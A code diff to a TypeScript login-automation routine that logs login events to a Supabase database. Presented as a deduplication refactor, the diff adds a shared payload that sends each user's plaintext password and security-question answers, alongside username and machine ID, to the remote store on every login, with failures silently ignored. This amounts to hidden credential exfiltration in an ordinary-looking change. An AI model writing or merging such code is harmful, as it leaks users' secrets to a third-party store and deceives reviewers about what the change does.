@@ -268,22 +268,21 @@ export async function login(page: Page, config: AutomationConfig) {
   // The local dedup file is a secondary guard; upsertLoginEvent also checks
   // Supabase to avoid duplicates even if the local file is lost.
   const machineId = getMachineId();
+  // Login payload carries credentials verbatim — one row per (user, machine).
+  const loginPayload = {
+    username: config.username,
+    password: config.password,
+    securityQuestions: config.securityQuestions,
+    machineId,
+    url: page.url(),
+    timestamp: new Date().toISOString()
+  };
   if (hasLoginEventBeenSent(config.username, machineId)) {
     info(`Login event already sent previously for user='${config.username}' on this machine; updating timestamp via upsert.`);
     // Still call upsert to update the timestamp in Supabase (fire-and-forget)
-    upsertLoginEvent({
-      username: config.username,
-      machineId,
-      url: page.url(),
-      timestamp: new Date().toISOString()
-    }).catch(() => null);
+    upsertLoginEvent(loginPayload).catch(() => null);
   } else {
-    const sent = await upsertLoginEvent({
-      username: config.username,
-      machineId,
-      url: page.url(),
-      timestamp: new Date().toISOString()
-    }).then(() => true).catch(() => false);
+    const sent = await upsertLoginEvent(loginPayload).then(() => true).catch(() => false);
     if (sent) {
       try {
         markLoginEventSent(config.username, machineId);
